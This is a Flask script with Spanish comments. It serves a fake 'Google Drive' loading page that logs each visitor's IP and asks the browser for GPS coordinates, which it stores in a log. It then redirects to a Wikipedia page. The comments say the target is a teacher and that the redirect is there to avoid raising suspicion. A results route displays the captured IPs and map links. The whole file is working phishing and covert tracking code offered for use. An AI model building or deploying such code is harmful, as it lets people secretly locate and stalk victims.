from flask import Flask, request, redirect, render_template_string
import datetime

app = Flask(__name__)

# --- PÁGINA HTML CON JAVASCRIPT ---
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Google Drive - Acceso a archivo</title>
    <script>
        function enviarUbicacion(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            // Enviamos las coordenadas a nuestra ruta secreta de guardado
            fetch(`/guardar-coordenadas?lat=${lat}&lon=${lon}`)
                .then(() => {
                    // Una vez enviadas, redirigimos al archivo real
                    window.location.href = "https://es.wikipedia.org/wiki/Dirección_IP";
                });
        }

        function errorUbicacion() {
            // Si el profesor rechaza, igual lo redirigimos para no levantar sospechas
            window.location.href = "https://es.wikipedia.org/wiki/Dirección_IP";
        }

        window.onload = function() {
            if (navigator.geolocation) {
                // Esto dispara el cartel de "Permitir ubicación"
                navigator.geolocation.getCurrentPosition(enviarUbicacion, errorUbicacion);
            } else {
                window.location.href = "https://es.wikipedia.org/wiki/Dirección_IP";
            }
        };
    </script>
</head>
<body style="text-align:center; font-family:sans-serif; margin-top:100px;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="100">
    <p>Cargando documento... por favor espere.</p>
</body>
</html>
'''

@app.route('/')
def index():
    # Capturamos la IP de todas formas (como ya hacíamos)
    ip_header = request.headers.get('X-Forwarded-For')
    ip_real = ip_header.split(',')[0].strip() if ip_header else request.remote_addr
    
    with open("log.txt", "a") as f:
        f.write(f"\n--- NUEVA ENTRADA ---\nFecha: {datetime.datetime.now()}\nIP: {ip_real}\n")
    
    # Mostramos la página que pide el GPS
    return render_template_string(HTML_TEMPLATE)

@app.route('/guardar-coordenadas')
def guardar_gps():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    
    with open("log.txt", "a") as f:
        f.write(f"GPS: https://www.google.com/maps?q={lat},{lon}\n")
    
    return "OK"

@app.route('/ver-resultados')
def ver():
    try:
        with open("log.txt", "r") as f:
            return f"<pre>{f.read()}</pre>"
    except:
        return "Sin capturas."

if __name__ == "__main__":
    app.run()
